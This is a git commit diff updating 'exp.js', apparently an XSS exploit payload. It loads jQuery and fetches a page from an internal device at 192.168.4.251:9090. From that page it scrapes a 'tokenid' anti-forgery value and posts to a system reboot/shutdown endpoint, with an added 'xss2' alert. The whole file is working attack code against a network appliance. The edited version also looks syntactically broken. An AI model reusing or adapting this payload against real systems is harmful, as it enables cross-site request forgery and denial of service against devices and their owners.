ab291db271fd1082042cb899e329f8c44ab3675e
hellohackerbaby <118070104+hellohackerbaby@users.noreply.github.com>
2023-03-03 11:00:21 +0800

    Update exp.js

--- exp.js
+++ exp.js
@@ -1,18 +1,13 @@
-
 function loadScript(url){
     var script = document.createElement("script");
     script.type = "text/javascript";
     script.src = url;
-    document.body.appendChild(script);
+    var html = document.documentElement;
+    html.insertBefore(script, html.firstChild);
+    alert("xss2");
 }
-window.onload = function (){
-    loadScript("https://libs.baidu.com/jquery/2.0.0/jquery.min.js");
-}
-let vdata = null;
-setTimeout(test, 1000)
-function test(){
-    $(function(){
-        $.get("https://192.168.4.251:9090/top.php", function(data){
+loadScript("https://libs.baidu.com/jquery/2.0.0/jquery.min.js");
+$.get("https://192.168.4.251:9090/top.php", function(data){
             vdata = data;
             var token = $(vdata).find("input[name=tokenid]")[0].value;
             $.post('https://192.168.4.251:9090/view/systemConfig/reboot/shutdown_commit.php',
@@ -29,6 +24,4 @@ function test(){
                 }
             );
 
-    })});
-    
-}
+    })
